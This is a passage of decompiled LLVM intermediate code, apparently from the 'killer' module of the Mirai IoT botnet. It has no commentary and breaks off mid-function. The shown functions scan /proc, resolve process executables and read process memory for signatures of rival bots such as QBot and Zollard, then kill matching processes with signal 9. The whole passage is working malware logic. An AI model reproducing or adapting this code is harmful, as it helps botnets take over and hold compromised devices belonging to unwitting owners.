  %v2_1369c = icmp eq i8 %listening_state_-33.1.ph.lcssa, 0
  br i1 %v2_1369c, label %dec_label_pc_13784, label %dec_label_pc_136b4.preheader

dec_label_pc_136b4.preheader:                     ; preds = %dec_label_pc_13690
  %v2_136cc69 = load i8, i8* %v1_13684153, align 1
  %v2_136d071 = icmp eq i8 %v2_136cc69, 0
  br i1 %v2_136d071, label %dec_label_pc_136fc, label %dec_label_pc_136d8

dec_label_pc_136a8:                               ; preds = %dec_label_pc_136d8
  %v1_136ac = add i32 %ii_-48.472, 1
  %v2_136c8 = add i32 %v1_136ac, %v3_13230
  %v1_136cc = inttoptr i32 %v2_136c8 to i8*
  %v2_136cc = load i8, i8* %v1_136cc, align 1
  %v2_136d0 = icmp eq i8 %v2_136cc, 0
  br i1 %v2_136d0, label %dec_label_pc_136fc, label %dec_label_pc_136d8

dec_label_pc_136d8:                               ; preds = %dec_label_pc_136b4.preheader, %dec_label_pc_136a8
  %v1_136cc74 = phi i8* [ %v1_136cc, %dec_label_pc_136a8 ], [ %v1_13684153, %dec_label_pc_136b4.preheader ]
  %ii_-48.472 = phi i32 [ %v1_136ac, %dec_label_pc_136a8 ], [ %v1_13664157, %dec_label_pc_136b4.preheader ]
  %v2_136f0 = load i8, i8* %v1_136cc74, align 1
  %v7_136f4 = icmp eq i8 %v2_136f0, 32
  br i1 %v7_136f4, label %dec_label_pc_136fc, label %dec_label_pc_136a8

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136a8, %dec_label_pc_136d8, %dec_label_pc_136b4.preheader
  %v1_136cc.lcssa = phi i8* [ %v1_13684153, %dec_label_pc_136b4.preheader ], [ %v1_136cc, %dec_label_pc_136a8 ], [ %v1_136cc74, %dec_label_pc_136d8 ]
  store i8 0, i8* %v1_136cc.lcssa, align 1
  %v3_13744 = call i32 @util_strlen(i8* %v1_13684153)
  %v8_13750 = icmp sgt i32 %v3_13744, 15
  br i1 %v8_13750, label %dec_label_pc_13784, label %dec_label_pc_13754

dec_label_pc_13754:                               ; preds = %dec_label_pc_136fc
  %v6_1377c = call i32 @util_strcpy(i8* %v3_13278, i8* %v1_13684153)
  br label %dec_label_pc_137ac

dec_label_pc_13784:                               ; preds = %dec_label_pc_136fc, %dec_label_pc_13690, %dec_label_pc_134f0, %dec_label_pc_13460, %dec_label_pc_133b0
  %v6_1379c = call i8* @util_fdgets(i8* %v3_13248, i32 512, i32 %v3_133d0)
  %v2_137a4 = icmp eq i8* %v6_1379c, null
  br i1 %v2_137a4, label %dec_label_pc_137ac, label %dec_label_pc_13418.preheader

dec_label_pc_13418.preheader:                     ; preds = %dec_label_pc_13784
  %v2_1343025 = load i8, i8* %v3_13248, align 4
  %v2_1343427 = icmp eq i8 %v2_1343025, 0
  br i1 %v2_1343427, label %dec_label_pc_13460, label %dec_label_pc_1343c

dec_label_pc_137ac:                               ; preds = %dec_label_pc_13784, %dec_label_pc_13754
  %v1_137b0 = call i32 @__GI___libc_close(i32 %v3_133d0)
  %v3_137c4 = call i32 @util_strlen(i8* %v3_13278)
  %v2_137cc = icmp eq i32 %v3_137c4, 0
  br i1 %v2_137cc, label %dec_label_pc_137d4, label %dec_label_pc_137fc

dec_label_pc_137d4:                               ; preds = %dec_label_pc_137ac
  call void @table_lock_val(i8 6)
  call void @table_lock_val(i8 7)
  call void @table_lock_val(i8 9)
  br label %dec_label_pc_13bac

dec_label_pc_137fc:                               ; preds = %dec_label_pc_137ac
  %v3_13804 = call i8* @table_retrieve_val(i32 6, i32* null)
  %v5_13804 = ptrtoint i8* %v3_13804 to i32
  %v1_13810 = call i32 @__GI_opendir(i32 %v5_13804)
  %v2_13820 = icmp eq i32 %v1_13810, 0
  br i1 %v2_13820, label %dec_label_pc_13b7c, label %dec_label_pc_13b4c.preheader

dec_label_pc_13b4c.preheader:                     ; preds = %dec_label_pc_137fc
  %v1_13b50 = inttoptr i32 %v1_13810 to i32*
  %v2_13b5015 = call i32 @__GI_readdir(i32* %v1_13b50)
  %v2_13b6017 = icmp eq i32 %v2_13b5015, 0
  br i1 %v2_13b6017, label %dec_label_pc_13b74, label %dec_label_pc_13b68

dec_label_pc_1382c:                               ; preds = %dec_label_pc_13b68
  %v1_13830 = add i32 %v2_13b5019, 11
  %v4_13834 = inttoptr i32 %v1_13830 to i8*
  %v2_1383c = load i8, i8* %v4_13834, align 1
  %tmp = icmp ult i8 %v2_1383c, 48
  br i1 %tmp, label %dec_label_pc_13b4c.backedge, label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %dec_label_pc_1382c
  %v2_1384c = load i8, i8* %v4_13834, align 1
  %tmp196 = icmp ugt i8 %v2_1384c, 57
  br i1 %tmp196, label %dec_label_pc_13b4c.backedge, label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %dec_label_pc_13848
  %v3_13860 = call i8* @table_retrieve_val(i32 6, i32* null)
  %v6_13870 = call i32 @util_strcpy(i8* %v3_13200, i8* %v3_13860)
  %v3_13878 = call i32 @util_strlen(i8* %v3_13200)
  %v2_13888 = add i32 %v3_13878, %v3_131f0
  %v1_1388c = inttoptr i32 %v2_13888 to i8*
  %v6_13894 = call i32 @util_strcpy(i8* %v1_1388c, i8* nonnull %v4_13834)
  %v3_1389c = call i32 @util_strlen(i8* %v3_13200)
  %v2_138ac = add i32 %v3_1389c, %v3_131f0
  store i32 %v2_138ac, i32* @r4, align 4
  %v3_138b8 = call i8* @table_retrieve_val(i32 7, i32* null)
  %v0_138c0 = load i32, i32* @r4, align 4
  %v1_138c0 = inttoptr i32 %v0_138c0 to i8*
  %v6_138c8 = call i32 @util_strcpy(i8* %v1_138c0, i8* %v3_138b8)
  %v4_138f0 = call i32 @readlink(i32 %v3_131f0, i32 %v3_13210, i32 4096, i32 %v3_13210)
  %v7_138f8 = icmp eq i32 %v4_138f0, -1
  br i1 %v7_138f8, label %dec_label_pc_13b4c.backedge, label %dec_label_pc_13900

dec_label_pc_13900:                               ; preds = %dec_label_pc_13858
  %v3_13908 = call i8* @table_retrieve_val(i32 6, i32* null)
  %v6_13918 = call i32 @util_strcpy(i8* %v3_13200, i8* %v3_13908)
  %v3_13920 = call i32 @util_strlen(i8* %v3_13200)
  %v2_13930 = add i32 %v3_13920, %v3_131f0
  %v1_13934 = inttoptr i32 %v2_13930 to i8*
  %v6_1393c = call i32 @util_strcpy(i8* %v1_13934, i8* nonnull %v4_13834)
  %v3_13944 = call i32 @util_strlen(i8* %v3_13200)
  %v2_13954 = add i32 %v3_13944, %v3_131f0
  store i32 %v2_13954, i32* @r4, align 4
  %v3_13960 = call i8* @table_retrieve_val(i32 9, i32* null)
  %v0_13968 = load i32, i32* @r4, align 4
  %v1_13968 = inttoptr i32 %v0_13968 to i8*
  %v6_13970 = call i32 @util_strcpy(i8* %v1_13968, i8* %v3_13960)
  %v1_13984 = call i32 @__GI_opendir(i32 %v3_131f0)
  %v2_13994 = icmp eq i32 %v1_13984, 0
  br i1 %v2_13994, label %dec_label_pc_13b4c.backedge, label %dec_label_pc_13b1c.preheader

dec_label_pc_13b1c.preheader:                     ; preds = %dec_label_pc_13900
  %v1_13b20 = inttoptr i32 %v1_13984 to i32*
  %v2_13b207 = call i32 @__GI_readdir(i32* %v1_13b20)
  %v2_13b309 = icmp eq i32 %v2_13b207, 0
  br i1 %v2_13b309, label %dec_label_pc_13b44, label %dec_label_pc_13b38

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13b38
  %v1_139a4 = add i32 %v2_13b2011, 11
  %v4_139a8 = inttoptr i32 %v1_139a4 to i8*
  call void @util_zero(i8* %v3_13220, i32 4096)
  %v3_139cc = call i8* @table_retrieve_val(i32 6, i32* null)
  %v6_139dc = call i32 @util_strcpy(i8* %v3_13200, i8* %v3_139cc)
  %v3_139e4 = call i32 @util_strlen(i8* %v3_13200)
  %v2_139f4 = add i32 %v3_139e4, %v3_131f0
  %v1_139f8 = inttoptr i32 %v2_139f4 to i8*
  %v6_13a00 = call i32 @util_strcpy(i8* %v1_139f8, i8* %v4_13834)
  %v3_13a08 = call i32 @util_strlen(i8* %v3_13200)
  %v2_13a18 = add i32 %v3_13a08, %v3_131f0
  store i32 %v2_13a18, i32* @r4, align 4
  %v3_13a24 = call i8* @table_retrieve_val(i32 9, i32* null)
  %v0_13a2c = load i32, i32* @r4, align 4
  %v1_13a2c = inttoptr i32 %v0_13a2c to i8*
  %v6_13a34 = call i32 @util_strcpy(i8* %v1_13a2c, i8* %v3_13a24)
  %v3_13a3c = call i32 @util_strlen(i8* %v3_13200)
  %v2_13a4c = add i32 %v3_13a3c, %v3_131f0
  %v1_13a50 = inttoptr i32 %v2_13a4c to i8*
  %v6_13a58 = call i32 @util_strcpy(i8* %v1_13a50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22e5c.116, i32 0, i32 0))
  %v3_13a60 = call i32 @util_strlen(i8* %v3_13200)
  %v2_13a70 = add i32 %v3_13a60, %v3_131f0
  %v1_13a74 = inttoptr i32 %v2_13a70 to i8*
  %v6_13a7c = call i32 @util_strcpy(i8* %v1_13a74, i8* %v4_139a8)
  %v4_13aa4 = call i32 @readlink(i32 %v3_131f0, i32 %v3_13210, i32 4096, i32 %v3_13210)
  %v7_13aac = icmp eq i32 %v4_13aa4, -1
  br i1 %v7_13aac, label %dec_label_pc_13b1c.backedge, label %dec_label_pc_13ab4

dec_label_pc_13ab4:                               ; preds = %dec_label_pc_139a0
  %v3_13ac4 = call i32 @util_strlen(i8* %v3_13220)
  %v7_13ae8 = call i32 @util_stristr(i8* %v3_13220, i32 %v3_13ac4, i8* %v3_13278)
  %v7_13af0 = icmp eq i32 %v7_13ae8, -1
  br i1 %v7_13af0, label %dec_label_pc_13b1c.backedge, label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %dec_label_pc_13ab4
  %v4_13b00 = call i32 @util_atoi(i8* %v4_13834, i32 10)
  %v2_13b10 = call i32 @kill(i32 %v4_13b00, i32 9)
  br label %dec_label_pc_13b1c.backedge

dec_label_pc_13b1c.backedge:                      ; preds = %dec_label_pc_13af8, %dec_label_pc_139a0, %dec_label_pc_13ab4
  %i_-52.0.be = phi i32 [ 0, %dec_label_pc_139a0 ], [ 0, %dec_label_pc_13ab4 ], [ 1, %dec_label_pc_13af8 ]
  %v2_13b20 = call i32 @__GI_readdir(i32* %v1_13b20)
  %v2_13b30 = icmp eq i32 %v2_13b20, 0
  br i1 %v2_13b30, label %dec_label_pc_13b44, label %dec_label_pc_13b38

dec_label_pc_13b38:                               ; preds = %dec_label_pc_13b1c.preheader, %dec_label_pc_13b1c.backedge
  %v2_13b2011 = phi i32 [ %v2_13b20, %dec_label_pc_13b1c.backedge ], [ %v2_13b207, %dec_label_pc_13b1c.preheader ]
  %i_-52.010 = phi i32 [ %i_-52.0.be, %dec_label_pc_13b1c.backedge ], [ 0, %dec_label_pc_13b1c.preheader ]
  %v2_13b3c = icmp eq i32 %i_-52.010, 0
  br i1 %v2_13b3c, label %dec_label_pc_139a0, label %dec_label_pc_13b44

dec_label_pc_13b44:                               ; preds = %dec_label_pc_13b1c.backedge, %dec_label_pc_13b38, %dec_label_pc_13b1c.preheader
  %i_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_13b1c.preheader ], [ %i_-52.0.be, %dec_label_pc_13b1c.backedge ], [ 1, %dec_label_pc_13b38 ]
  %v2_13b48 = call i32 @__GI_closedir(i32* %v1_13b20)
  br label %dec_label_pc_13b4c.backedge

dec_label_pc_13b4c.backedge:                      ; preds = %dec_label_pc_13b44, %dec_label_pc_1382c, %dec_label_pc_13848, %dec_label_pc_13858, %dec_label_pc_13900
  %i_-52.1.be = phi i32 [ 0, %dec_label_pc_1382c ], [ 0, %dec_label_pc_13848 ], [ 0, %dec_label_pc_13858 ], [ 0, %dec_label_pc_13900 ], [ %i_-52.0.lcssa, %dec_label_pc_13b44 ]
  %v2_13b50 = call i32 @__GI_readdir(i32* %v1_13b50)
  %v2_13b60 = icmp eq i32 %v2_13b50, 0
  br i1 %v2_13b60, label %dec_label_pc_13b74, label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b4c.preheader, %dec_label_pc_13b4c.backedge
  %v2_13b5019 = phi i32 [ %v2_13b50, %dec_label_pc_13b4c.backedge ], [ %v2_13b5015, %dec_label_pc_13b4c.preheader ]
  %i_-52.118 = phi i32 [ %i_-52.1.be, %dec_label_pc_13b4c.backedge ], [ 0, %dec_label_pc_13b4c.preheader ]
  %v2_13b6c = icmp eq i32 %i_-52.118, 0
  br i1 %v2_13b6c, label %dec_label_pc_1382c, label %dec_label_pc_13b74

dec_label_pc_13b74:                               ; preds = %dec_label_pc_13b4c.backedge, %dec_label_pc_13b68, %dec_label_pc_13b4c.preheader
  %i_-52.1.lcssa = phi i32 [ 0, %dec_label_pc_13b4c.preheader ], [ %i_-52.1.be, %dec_label_pc_13b4c.backedge ], [ 1, %dec_label_pc_13b68 ]
  %v2_13b78 = call i32 @__GI_closedir(i32* %v1_13b50)
  br label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %dec_label_pc_137fc, %dec_label_pc_13b74
  %i_-52.2 = phi i32 [ 0, %dec_label_pc_137fc ], [ %i_-52.1.lcssa, %dec_label_pc_13b74 ]
  %v1_13b80 = call i32 @sleep(i32 1)
  call void @table_lock_val(i8 6)
  call void @table_lock_val(i8 7)
  call void @table_lock_val(i8 9)
  %v1_13ba0 = urem i32 %i_-52.2, 256
  %extract.t = trunc i32 %v1_13ba0 to i8
  br label %dec_label_pc_13bac

dec_label_pc_13bac:                               ; preds = %dec_label_pc_137d4, %dec_label_pc_133e8, %dec_label_pc_13b7c
  %v3_13bb0.off0 = phi i8 [ 0, %dec_label_pc_137d4 ], [ 0, %dec_label_pc_133e8 ], [ %extract.t, %dec_label_pc_13b7c ]
  store i32 %v3_131c0, i32* @r4, align 4
  store i32 %v6_131c0, i32* @fp, align 4
  ret i8 %v3_13bb0.off0

; uselistorder directives
  uselistorder i32* %v1_13b20, { 0, 2, 1 }
  uselistorder i32* %v1_13b50, { 0, 2, 1 }
  uselistorder i32 %v1_136ac, { 1, 0 }
  uselistorder i8* %v1_13684153, { 1, 3, 4, 0, 2 }
  uselistorder i8* %v1_13684163, { 0, 2, 1 }
  uselistorder i32 %v1_13664161, { 0, 2, 1 }
  uselistorder i32 %column_index_-40.1.ph59, { 2, 0, 1 }
  uselistorder i8 %listening_state_-33.1.ph60, { 0, 1, 4, 3, 2 }
  uselistorder i32 %ii_-48.2.ph61, { 1, 0 }
  uselistorder i32 %column_index_-40.04, { 1, 0 }
  uselistorder i8* %v1_13684, { 0, 2, 1 }
  uselistorder i32 %v1_13664, { 0, 2, 1 }
  uselistorder i32 %v1_13664169, { 0, 2, 3, 1 }
  uselistorder i8* %v1_13684171, { 0, 2, 1 }
  uselistorder i32 %v1_134a0, { 0, 2, 1 }
  uselistorder i8* %v1_134c038, { 2, 1, 0, 3 }
  uselistorder i32 %v1_13488, { 2, 0, 1 }
  uselistorder i32 %v1_13410, { 0, 2, 1 }
  uselistorder i8* %v3_13278, { 1, 2, 0, 3 }
  uselistorder i8* %v3_13248, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v3_13230, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v3_13210, { 1, 2, 0, 3 }
  uselistorder i32 %v3_131f0, { 8, 0, 1, 2, 3, 9, 4, 5, 10, 6, 7 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_atoi, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 1, 0, 5, 2 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i8*, i32, i8*)* @util_stristr, { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 10, 11, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13bac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13b7c, { 1, 0 }
  uselistorder label %dec_label_pc_13b74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b68, { 1, 0 }
  uselistorder label %dec_label_pc_13b4c.backedge, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_13b44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b38, { 1, 0 }
  uselistorder label %dec_label_pc_13b1c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_136fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136d8, { 1, 0 }
  uselistorder label %dec_label_pc_13690, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13660.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1364c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_134f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_134cc, { 1, 0 }
  uselistorder label %dec_label_pc_13460, { 2, 1, 0 }
  uselistorder label %dec_label_pc_133b0, { 1, 0 }
}

define i8 @has_exe_access() local_unnamed_addr {
entry:
  %ptr_path_-4140 = alloca i8*, align 4
  %path_-4124 = alloca [4096 x i8], align 1
  %stack_var_-4 = alloca i32, align 4
  %v3_13bd0 = load i32, i32* @fp, align 4
  store i32 80856, i32* %stack_var_-4, align 4
  %v2_13bd4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13bd4, i32* @fp, align 4
  %v2_13be8 = ptrtoint [4096 x i8]* %path_-4124 to i32
  call void @table_unlock_val(i8 6)
  call void @table_unlock_val(i8 7)
  %v3_13c08 = call i8* @table_retrieve_val(i32 6, i32* null)
  %v4_13c10 = getelementptr inbounds [4096 x i8], [4096 x i8]* %path_-4124, i32 0, i32 0
  %v6_13c18 = call i32 @util_strcpy(i8* %v4_13c10, i8* %v3_13c08)
  %v2_13c28 = add i32 %v6_13c18, %v2_13be8
  %v0_13c30 = call i32 @__getpid()
  %tmp16 = bitcast i8** %ptr_path_-4140 to i8*
  %v5_13c50 = call i8* @util_itoa(i32 %v0_13c30, i32 10, i8* %tmp16)
  %v4_13c58 = inttoptr i32 %v2_13c28 to i8*
  %v6_13c60 = call i32 @util_strcpy(i8* %v4_13c58, i8* %v5_13c50)
  %v2_13c70 = add i32 %v6_13c60, %v2_13c28
  %v3_13c80 = call i8* @table_retrieve_val(i32 7, i32* null)
  %v4_13c88 = inttoptr i32 %v2_13c70 to i8*
  %v6_13c90 = call i32 @util_strcpy(i8* %v4_13c88, i8* %v3_13c80)
  store i32 %v6_13c90, i32* @r2, align 4
  store i32 %v2_13be8, i32* @r3, align 4
  %v2_13cbc = call i32 @__libc_open(i32 %v2_13be8, i32 0)
  %v3_13ccc = icmp eq i32 %v2_13cbc, -1
  br i1 %v3_13ccc, label %dec_label_pc_13d88, label %dec_label_pc_13ce4

dec_label_pc_13ce4:                               ; preds = %entry
  %v1_13ce8 = call i32 @__GI___libc_close(i32 %v2_13cbc)
  call void @table_lock_val(i8 6)
  call void @table_lock_val(i8 7)
  %v2_13d00 = load i32, i32* @killer_realpath.109, align 4
  %v4_13d20 = call i32 @readlink(i32 %v2_13be8, i32 %v2_13d00, i32 4095, i32 %v2_13be8)
  %v7_13d30 = icmp eq i32 %v4_13d20, -1
  br i1 %v7_13d30, label %dec_label_pc_13d50, label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %dec_label_pc_13ce4
  %v2_13d3c = load i32, i32* @killer_realpath.109, align 4
  %v2_13d44 = add i32 %v2_13d3c, %v4_13d20
  %v3_13d4c = inttoptr i32 %v2_13d44 to i8*
  store i8 0, i8* %v3_13d4c, align 1
  br label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13ce4, %dec_label_pc_13d38
  %v2_13ca0 = add i32 %v6_13c60, %v6_13c18
  %v2_13d60 = add i32 %v2_13ca0, %v6_13c90
  call void @util_zero(i8* %v4_13c10, i32 %v2_13d60)
  br label %dec_label_pc_13d88

dec_label_pc_13d88:                               ; preds = %entry, %dec_label_pc_13d50
  %storemerge2.off0 = phi i8 [ 1, %dec_label_pc_13d50 ], [ 0, %entry ]
  store i32 %v3_13bd0, i32* @fp, align 4
  ret i8 %storemerge2.off0

; uselistorder directives
  uselistorder i32 %v4_13d20, { 1, 0 }
  uselistorder i32 %v2_13be8, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32* @killer_realpath.109, { 1, 2, 3, 0 }
  uselistorder i8* (i32, i32, i8*)* @util_itoa, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13d88, { 1, 0 }
  uselistorder label %dec_label_pc_13d50, { 1, 0 }
}

define i8 @memory_scan_match(i8* %path) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %path to i32
  %m_qbot_dup_-4144 = alloca i8*, align 4
  %m_zollard_len_-4164 = alloca i32, align 4
  %fd_-4160 = alloca i32, align 4
  %ret_-4156 = alloca i32, align 4
  %m_qbot_report_-4152 = alloca i8*, align 4
  %m_qbot_http_-4148 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13da8 = load i32, i32* @fp, align 4
  store i32 %v3_13da8, i32* %stack_var_-16, align 4
  store i32 81328, i32* %stack_var_-4, align 4
  %v13_13da8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_13dac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13dac, i32* @fp, align 4
  store i32 -4156, i32* @r3, align 4
  store i32 %v13_13da8, i32* @r2, align 4
  %v3_13de0 = call i32 @__libc_open(i32 %tmp, i32 0)
  %v3_13df0 = icmp eq i32 %v3_13de0, -1
  br i1 %v3_13df0, label %dec_label_pc_14078, label %dec_label_pc_13e08

dec_label_pc_13e08:                               ; preds = %entry
  call void @table_unlock_val(i8 12)
  call void @table_unlock_val(i8 13)
  call void @table_unlock_val(i8 14)
  call void @table_unlock_val(i8 15)
  call void @table_unlock_val(i8 16)
  %v2_13e44 = bitcast i8** %m_qbot_http_-4148 to i32*
  %v3_13e44 = call i8* @table_retrieve_val(i32 12, i32* %v2_13e44)
  %v2_13e64 = bitcast i8** %m_qbot_report_-4152 to i32*
  %v3_13e64 = call i8* @table_retrieve_val(i32 13, i32* %v2_13e64)
  %v3_13e84 = call i8* @table_retrieve_val(i32 14, i32* nonnull %ret_-4156)
  %v3_13ea4 = call i8* @table_retrieve_val(i32 15, i32* nonnull %fd_-4160)
  %v3_13ec4 = call i8* @table_retrieve_val(i32 16, i32* nonnull %m_zollard_len_-4164)
  %v2_14014 = ptrtoint i8** %m_qbot_dup_-4144 to i32
  %tmp27 = bitcast i8** %m_qbot_dup_-4144 to i8*
  br label %dec_label_pc_1400c

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_1400c
  %v4_13ee0 = load i8*, i8** %m_qbot_http_-4148, align 4
  %v5_13ee0 = ptrtoint i8* %v4_13ee0 to i32
  %v10_13f00 = call i8 @mem_exists(i8* %tmp27, i32 %v1_14024, i8* %v3_13e44, i32 %v5_13ee0)
  %v2_13f08 = icmp eq i8 %v10_13f00, 0
  br i1 %v2_13f08, label %dec_label_pc_13f10, label %dec_label_pc_14000

dec_label_pc_13f10:                               ; preds = %dec_label_pc_13ed4
  %v4_13f1c = load i8*, i8** %m_qbot_report_-4152, align 4
  %v5_13f1c = ptrtoint i8* %v4_13f1c to i32
  %v9_13f3c = call i8 @mem_exists(i8* %tmp27, i32 %v1_14024, i8* %v3_13e64, i32 %v5_13f1c)
  %v2_13f44 = icmp eq i8 %v9_13f3c, 0
  br i1 %v2_13f44, label %dec_label_pc_13f4c, label %dec_label_pc_14000

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f10
  %v4_13f58 = load i32, i32* %ret_-4156, align 4
  %v9_13f78 = call i8 @mem_exists(i8* %tmp27, i32 %v1_14024, i8* %v3_13e84, i32 %v4_13f58)
  %v2_13f80 = icmp eq i8 %v9_13f78, 0
  br i1 %v2_13f80, label %dec_label_pc_13f88, label %dec_label_pc_14000

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f4c
  %v4_13f94 = load i32, i32* %fd_-4160, align 4
  %v9_13fb4 = call i8 @mem_exists(i8* %tmp27, i32 %v1_14024, i8* %v3_13ea4, i32 %v4_13f94)
  %v2_13fbc = icmp eq i8 %v9_13fb4, 0
  br i1 %v2_13fbc, label %dec_label_pc_13fc4, label %dec_label_pc_14000

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13f88
  %v4_13fd0 = load i32, i32* %m_zollard_len_-4164, align 4
  %v9_13ff0 = call i8 @mem_exists(i8* %tmp27, i32 %v1_14024, i8* %v3_13ec4, i32 %v4_13fd0)
  %v2_13ff8 = icmp eq i8 %v9_13ff0, 0
  br i1 %v2_13ff8, label %dec_label_pc_1400c, label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %dec_label_pc_13f88, %dec_label_pc_13f4c, %dec_label_pc_13f10, %dec_label_pc_13ed4, %dec_label_pc_13fc4
  br label %dec_label_pc_1403c

dec_label_pc_1400c:                               ; preds = %dec_label_pc_13fc4, %dec_label_pc_13e08
  store i32 %v2_14014, i32* @r3, align 4
  store i32 %v2_14014, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_14024 = call i32 @__libc_read(i32 %v3_13de0)
  %v5_14038 = icmp sgt i32 %v1_14024, 0
  br i1 %v5_14038, label %dec_label_pc_13ed4, label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %dec_label_pc_1400c, %dec_label_pc_14000
  %found_-17.0.off0 = phi i8 [ 1, %dec_label_pc_14000 ], [ 0, %dec_label_pc_1400c ]
  call void @table_lock_val(i8 12)
  call void @table_lock_val(i8 13)
  call void @table_lock_val(i8 14)
  call void @table_lock_val(i8 15)
  call void @table_lock_val(i8 16)
  %v1_14068 = call i32 @__GI___libc_close(i32 %v3_13de0)
  br label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %entry, %dec_label_pc_1403c
  %storemerge3.off0 = phi i8 [ %found_-17.0.off0, %dec_label_pc_1403c ], [ 0, %entry ]
  %v2_14088 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14088, i32* @fp, align 4
  ret i8 %storemerge3.off0

; uselistorder directives
  uselistorder i32 %v1_14024, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %tmp27, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %m_qbot_http_-4148, { 1, 0 }
  uselistorder i8** %m_qbot_report_-4152, { 1, 0 }
  uselistorder i32* %ret_-4156, { 1, 0 }
  uselistorder i32* %fd_-4160, { 1, 0 }
  uselistorder i32* %m_zollard_len_-4164, { 1, 0 }
  uselistorder i8 (i8*, i32, i8*, i32)* @mem_exists, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14078, { 1, 0 }
  uselistorder label %dec_label_pc_14000, { 4, 0, 1, 2, 3 }
}

define i8 @mem_exists(i8* %buf, i32 %buf_len, i8* %str, i32 %str_len) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %str to i32
  store i32 %buf_len, i32* @r1, align 4
  %v7_140c4 = icmp sgt i32 %str_len, %buf_len
  br i1 %v7_140c4, label %dec_label_pc_140c8, label %dec_label_pc_14144.preheader

dec_label_pc_14144.preheader:                     ; preds = %entry
  %v3_141544 = icmp eq i32 %buf_len, 0
  br i1 %v3_141544, label %dec_label_pc_1415c, label %dec_label_pc_140d4

dec_label_pc_140c8:                               ; preds = %entry
  br label %dec_label_pc_14164

dec_label_pc_140d4:                               ; preds = %dec_label_pc_14144.preheader, %dec_label_pc_14144.backedge
  %v1_1414811.in = phi i32 [ %v1_1414811, %dec_label_pc_14144.backedge ], [ %buf_len, %dec_label_pc_14144.preheader ]
  %stack_var_-28.010 = phi i8* [ %v5_14108, %dec_label_pc_14144.backedge ], [ %buf, %dec_label_pc_14144.preheader ]
  %matches_-20.09 = phi i32 [ %matches_-20.0.be, %dec_label_pc_14144.backedge ], [ 0, %dec_label_pc_14144.preheader ]
  %v1_1414811 = add i32 %v1_1414811.in, -1
  %v4_140d4 = ptrtoint i8* %stack_var_-28.010 to i32
  %v2_140d8 = load i8, i8* %stack_var_-28.010, align 1
  %v3_140d8 = zext i8 %v2_140d8 to i32
  store i32 %v3_140d8, i32* @r1, align 4
  %v2_140e8 = add i32 %matches_-20.09, %tmp
  %v1_140ec = inttoptr i32 %v2_140e8 to i8*
  %v2_140ec = load i8, i8* %v1_140ec, align 1
  %v9_140f0 = icmp eq i8 %v2_140d8, %v2_140ec
  %v1_14104 = add i32 %v4_140d4, 1
  %v5_14108 = inttoptr i32 %v1_14104 to i8*
  %v2_1410c = icmp eq i1 %v9_140f0, false
  br i1 %v2_1410c, label %dec_label_pc_1413c, label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_140d4
  %v1_14118 = add i32 %matches_-20.09, 1
  %v9_14128 = icmp eq i32 %v1_14118, %str_len
  br i1 %v9_14128, label %dec_label_pc_14130, label %dec_label_pc_14144.backedge

dec_label_pc_14130:                               ; preds = %dec_label_pc_14114
  br label %dec_label_pc_14164

dec_label_pc_1413c:                               ; preds = %dec_label_pc_140d4
  br label %dec_label_pc_14144.backedge

dec_label_pc_14144.backedge:                      ; preds = %dec_label_pc_1413c, %dec_label_pc_14114
  %matches_-20.0.be = phi i32 [ 0, %dec_label_pc_1413c ], [ %v1_14118, %dec_label_pc_14114 ]
